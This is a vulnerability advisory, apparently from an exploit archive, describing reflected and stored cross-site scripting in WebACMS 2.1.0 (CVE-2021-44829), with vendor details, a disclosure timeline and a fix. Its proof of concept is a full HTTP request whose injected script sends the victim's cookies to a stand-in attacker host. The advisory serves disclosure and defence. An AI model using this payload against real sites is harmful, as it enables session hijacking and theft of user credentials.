@@ -1,0 +1,117 @@
+id: 37272
+date: 01/25/2022
+title: WebACMS 2.1.0 Cross Site Scripting Vulnerability
+author: Patrick Hener
+cves: CVE-2021-44829
+
+Product: WebACMS
+Vendor: AFI Solutions GmbH
+Tested Version: 2.1.0
+Fixed Version: -
+Vulnerability Type: Cross-Site Scripting (CWE-79)
+CVSSv2 Severity: AV:N/AC:L/Au:N/C:P/I:P/A:N (Score 6.4)
+CVSSv3 Severity: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (Score 6.1)
+Solution Status: Unfixed
+Manufacturer Notification: 2021-12-13
+Solution Date: 2022-01-17
+Public Disclosure: 2022-01-20
+CVE Reference: CVE-2021-44829
+Authors of Advisory: Patrick Hener & Siva Rajendran, Thinking Objects GmbH
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+The product "ACMS" of AFI Solutions GmbH [1] is a so called edi 
+converter. For
+companies to be able to exchange arbitrary data it is common to use a edi
+converter to convert between data formats of the sender and the recipient.
+The product of AFI Solutions also incorporates a web interface, which is the
+subject of this advisory.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The index page has a parameter "ID" which is used to navigate within the web
+application. It is not properly sanitized and will be rendered into the 
+login
+form of the index page, as well. The vulnerable code will be shown from the
+following listing:
+
+<FORM name=thisForm METHOD=post action="/index.html?id=1" target="_top">
+   <table class="logintable">
+     <tr>
+       <td width="110">Benutzername</td>
+       [.. truncated ..]
+</form>
+
+The parameter can be chosen from the actual url in the browser and thus is
+unsanitized user controlled input. This makes the application vulnerable to
+reflected Cross-Site Scripting. This vulnerability also applies to basically
+all user controlled input after login. Also content returned by the database
+is not properly sanitized before presentation, as well. Therefore the app is
+also vulnerable to stored Cross-Site Scripting.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+The following request will steal the applications insecure cookies using 
+this
+vulnerablity.
+
+GET 
+/index.html?id=%22%3E%3Cscript%3Edocument.location=%27http://evil.host.com
+   /cookies?%27%2Bdocument.cookie;%3C/script%3E%3Cid=%22 HTTP/1.1
+Host: vulnerable.host.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 
+Firefox/94.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,
+   image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: COMID=
+Upgrade-Insecure-Requests: 1
+
+This will render to the following html code and trigger in a victims 
+browser.
+
+<FORM name=thisForm METHOD=post action="/index.html?id="><script>
+document.location='http://evil.host.com/cookies?'+document.cookie;</script>
+   <id="" target="_top">
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+The user supplied data should be sanitized before using it to render a page.
+Also database retrieved content should be sanitized before presenting it 
+to the
+browser again.
+
+The vendor states that this software component was only used by the vendors
+support and that it is not used actively anymore. The vendor recommends to
+deactivate this component.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+2021-12-10: Vulnerability discovered
+2021-12-13: Vulnerability reported to manufacturer
+2022-01-17: Solution provided by manufacturer
+2022-01-20: Public disclosure of vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Vendor Website
+     https://www.afi-solutions.com/
+[2] Thinking Objects Security Advisory
+     https://blog.to.com/advisory-webacms-2-1-0-cross-site-scripting
+[3] Thinking Objects Responsible Disclosure Policy
+     https://blog.to.com/responsible-disclosure-policy/
+
+#  0day.today [2023-03-22]  #
